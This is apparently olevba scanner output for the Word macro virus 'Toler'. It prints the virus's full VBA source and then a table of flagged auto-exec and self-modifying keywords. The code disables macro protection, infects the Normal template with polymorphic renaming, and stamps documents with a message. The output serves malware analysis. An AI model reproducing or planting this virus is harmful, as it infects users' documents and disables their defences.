olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Toler-1c93c107ccb5b3a9525754319d00ea106e8a953c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Toler-1c93c107ccb5b3a9525754319d00ea106e8a953c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Tolerance!
Private Type AeaZ
  DpkigbZ As Integer
  DrvlZ As Integer
  QoijZ As Boolean
End Type

Private Sub Document_Close()

End Sub

Private Sub Document_New()

End Sub

Private Sub Document_Open()
  Randomize
  Options.VirusProtection = False
  Dim AsbyieZ As Object, JshshjsvZ As Object
  Set AsbyieZ = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
  Set JshshjsvZ = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
  Dim NudZ As AeaZ, EgacsZ As AeaZ: NudZ = WflwZ(AsbyieZ): EgacsZ = WflwZ(JshshjsvZ)
  If EgacsZ.DrvlZ = 0 Then
     FewpZ AsbyieZ, JshshjsvZ, NudZ, EgacsZ
     Options.SaveNormalPrompt = False
  End If
  If (NudZ.DrvlZ = 0) Or ((EgacsZ.DrvlZ <> 0) And (NudZ.DrvlZ <> EgacsZ.DrvlZ)) Then
     FewpZ JshshjsvZ, AsbyieZ, EgacsZ, NudZ
     
     





 
                                       
  ElseIf Rnd < 0.3 Then
     ActiveDocument.Range(0, 0).InsertParagraphBefore
     ActiveDocument.Range(0, 0).InsertBefore "MUD Forever! :-)"
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  End If
End Sub
Private Sub FewpZ(DpkigbZ As Object, XypmZ As Object, FromP As AeaZ, ToP As AeaZ)
  Dim FgoyZ As String, MemyZ
  FgoyZ = DpkigbZ.Lines(FromP.DpkigbZ, FromP.DrvlZ)
  MemyZ = Array("XfkqZ", "AeaZ", "DpkigbZ", "XypmZ", "EaqayjZ", "DrvlZ", "QoijZ", "AsbyieZ", "JshshjsvZ", "NudZ", "EgacsZ", "FewpZ", "FgoyZ", "IqmbZ", "UedxnoZ", "UvubZ", "WflwZ", "HwvcxZ", "MemyZ")
  For i = 0 To 18: HwvcxZ FgoyZ, (MemyZ(i)), XfkqZ(FgoyZ): Next i
  If ToP.QoijZ Then XypmZ.DeleteLines 1, XypmZ.CountOfLines
  XypmZ.AddFromString FgoyZ
End Sub
Private Function XfkqZ(FgoyZ As String) As String
  Dim IqmbZ As String: IqmbZ = ""
  While (InStr(FgoyZ, IqmbZ) <> 0) Or (Len(IqmbZ) < 3)
     IqmbZ = ""
     For i = 1 To 10
         If Rnd > 0.5 Then
            If Len(IqmbZ) = 0 Then
                  IqmbZ = IqmbZ + Chr(Int(Rnd * 25 + 65))
            Else: IqmbZ = IqmbZ + Chr(Int(Rnd * 25 + 97))
            End If
         End If
     Next i
     IqmbZ = IqmbZ + "Z"
  Wend
  XfkqZ = IqmbZ
End Function
Private Sub HwvcxZ(FgoyZ As String, UedxnoZ As String, UvubZ As String)
  Dim i As Long
  i = 1
  While InStr(i, FgoyZ, UedxnoZ) <> 0
        i = InStr(i, FgoyZ, UedxnoZ)
        FgoyZ = Left(FgoyZ, i - 1) + UvubZ + Mid$(FgoyZ, i + Len(UedxnoZ))
        Index = Index + 1
  Wend
End Sub
Private Function WflwZ(EaqayjZ As Object) As AeaZ
  WflwZ.DpkigbZ = 0
  WflwZ.DrvlZ = 0
  WflwZ.QoijZ = False
  For i = 1 To EaqayjZ.CountOfLines
   If EaqayjZ.Lines(i, 1) = "' Tolerance!" Then WflwZ.DpkigbZ = i
   If EaqayjZ.Lines(i, 1) = "End Function 'Tolerance!" Then WflwZ.DrvlZ = i - WflwZ.DpkigbZ + 1
   If InStr(EaqayjZ.Lines(i, 1), "Private Sub Document_Open()") = 1 Then WflwZ.QoijZ = True
  Next i
End Function 'Tolerance!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

